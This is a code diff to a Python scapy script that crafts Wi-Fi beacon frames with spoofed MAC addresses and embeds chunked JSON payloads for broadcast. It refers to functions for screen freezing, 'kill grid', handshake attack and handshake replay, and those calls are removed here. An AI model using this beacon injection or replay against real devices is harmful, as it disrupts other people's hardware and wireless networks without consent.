@@ -38,6 +38,7 @@ def get_pwn_packet():
     pwn_packet = rdpcap(pwn_packet_path)
     return pwn_packet[0]
 
+
 def get_blank_packet():
     pwn_packet = rdpcap(blank_packet_path)
     return pwn_packet[0]
@@ -61,7 +62,7 @@ def send_calling_card():
     packet = get_pwn_packet()
 
     load_payload_into_packet(packet, payload_chunks)
-    
+
     packet.show()
 
     send_packet(packet, 10, 2)
@@ -198,7 +199,7 @@ def handshake_attack():
 
 
 def send_test():
-    calling_card_payload = get_payload_data(pwn_payload_paths[TEST_PAYLOAD])
+    calling_card_payload = get_payload_data(pwn_payload_paths[CALLING_CARD_PAYLOAD])
     calling_card_payload["identity"] = get_random_identity()
     calling_card_payload_bytes = json.dumps(calling_card_payload).encode()
     print(calling_card_payload_bytes)
@@ -207,14 +208,13 @@ def send_test():
         calling_card_payload_bytes[i : i + 255]
         for i in range(0, len(calling_card_payload_bytes), 255)
     ]
-    packet = get_blank_packet()
+    packet = explain_packet()
 
     packet.show()
 
     load_payload_into_blank_packet(packet, payload_chunks)
 
     packet.show()
-
 
     send_packet(packet, 10, 2)
 
@@ -224,7 +224,7 @@ def craft_packet():
 
     dot11 = pwn_packet[Dot11]
 
-    dot11.setfieldval('addr3', 'be:ef:de:ad:be:ef')
+    dot11.setfieldval("addr3", "be:ef:de:ad:be:ef")
     dot11.show()
 
     beacon_frame = pwn_packet[Dot11][Dot11Beacon]
@@ -232,8 +232,9 @@ def craft_packet():
     beacon_frame.show()
     pwn_packet.show()
 
-    wrpcap("blank.pcap",pwn_packet)
+    wrpcap("blank.pcap", pwn_packet)
     return
+
 
 def load_payload_into_blank_packet(packet, payload_chunks):
     beacon_frame = packet[Dot11][Dot11Beacon]
@@ -247,15 +248,19 @@ def load_payload_into_blank_packet(packet, payload_chunks):
         last_elt = new_elt
 
 
-# craft_packet()
+def explain_packet():
+
+    packet2 = (
+        RadioTap()
+        / Dot11FCS(
+            addr1="ff:ff:ff:ff:ff:ff",
+            addr2="de:ad:be:ef:de:ad",
+            addr3="be:ef:de:ad:be:ef",
+        )
+        / Dot11Beacon()
+    )
+
+    return packet2
 
 
 send_test()
-# sleep(5)
-# send_calling_card()
-# send_screen_freeze()
-# sleep(5)
-# send_kill_grid()
-
-# handshake_attack()
-# replay_handshake(attack_handshake_path, "PWND U")
